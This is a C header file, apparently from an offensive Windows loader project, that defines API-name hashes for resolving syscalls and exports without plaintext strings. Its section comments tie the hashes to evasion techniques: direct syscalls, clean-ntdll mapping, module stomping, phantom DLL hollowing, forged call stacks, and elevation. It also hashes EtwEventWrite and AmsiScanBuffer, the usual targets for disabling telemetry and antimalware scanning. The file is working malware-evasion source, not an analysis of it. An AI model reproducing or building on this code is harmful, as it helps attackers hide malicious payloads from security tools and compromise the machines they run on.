#pragma once

// =============================================
// Hashes.h — JOAAT 32-bit name hashes for syscalls
// and dynamically-resolved Win32 APIs.
//
// Computed from API names via HashStringJenkinsOneAtATime32BitA.
// Used by FetchExportAddress / FetchNtSyscall to resolve exports
// without storing plaintext API names in the binary.
//
// When adding a new dynamically-resolved API:
//   1. Run Encrypt.py's hash helper (or compute by hand) to get
//      the 32-bit hash for the API name
//   2. Add a `<Name>_JOAAT` #define below
//   3. Reference it from C code via FetchExportAddress(module, <Name>_JOAAT)
//
// Hash values are stable across builds — they only depend on the
// API name string, not on Encrypt.py's per-run randomness.
// =============================================

// ----------- Syscall Name Hashes (Jenkins One-at-a-Time 32-bit) -----------
#define NtAllocateVirtualMemory_JOAAT   0xE33A06BF
#define NtProtectVirtualMemory_JOAAT    0x82BB0EE0
#define NtWaitForSingleObject_JOAAT     0xE2C26E26
#define NtCreateSection_JOAAT           0x9A538B2B
#define NtMapViewOfSection_JOAAT        0xD3B060A1
// Used only for bootstrap — clean-ntdll section mapping
#define NtOpenSection_JOAAT             0x6EC52BCD

// ----------- Exit Hook / Elevation (ntdll exports) -----------
#define RtlExitUserProcess_JOAAT        0x3DC05538
#define LdrAddRefDll_JOAAT              0x807ED758
#define NtOpenProcessToken_JOAAT        0xD5D4A26D
#define NtQueryInformationToken_JOAAT   0x28CEAE31
#define NtClose_JOAAT                   0xB1D7C572
#define NtTerminateProcess_JOAAT        0x9C12CA95

// ----------- Unwind-info registration for stomped modules -----------
#define RtlAddFunctionTable_JOAAT       0xF1F158AB

// ----------- Synthetic call-stack frames (Draugr MVP) -----------
// (NtWaitForSingleObject_JOAAT is already defined above — reused here as
// one of the three anchor RIPs for the fake stack.)
#define RtlUserThreadStart_JOAAT        0xF7972684
#define BaseThreadInitThunk_JOAAT       0x50635B44

// ----------- Elevation (kernel32 exports) -----------
#define GetModuleFileNameA_JOAAT        0x665A0D0F

// ----------- Phantom DLL Hollowing Hashes (kernel32 exports) -----------
#define ReadFile_JOAAT                  0x62BF1D54
#define WriteFile_JOAAT                 0x8CFB9E0E
#define SetFilePointer_JOAAT            0xCF8699F2
#define CloseHandle_JOAAT               0x8FA1D581

// ----------- Thread Pool Hashes (ntdll exports, resolved via FetchExportAddress) -----------
#define TpAllocWork_JOAAT               0xE6CACAE7
#define TpPostWork_JOAAT                0xBEF96313
#define TpReleaseWork_JOAAT             0xBA0F3087

// ----------- WinAPI Name Hashes -----------
#define LoadLibraryA_JOAAT              0xEC33D795
#define GetProcAddress_JOAAT            0x8F900864
#define GetModuleHandleA_JOAAT          0x9D783EFE
#define VirtualProtect_JOAAT            0x69B260D2
#define EtwEventWrite_JOAAT             0xEF9B6F9B
#define AmsiScanBuffer_JOAAT            0x725879AF
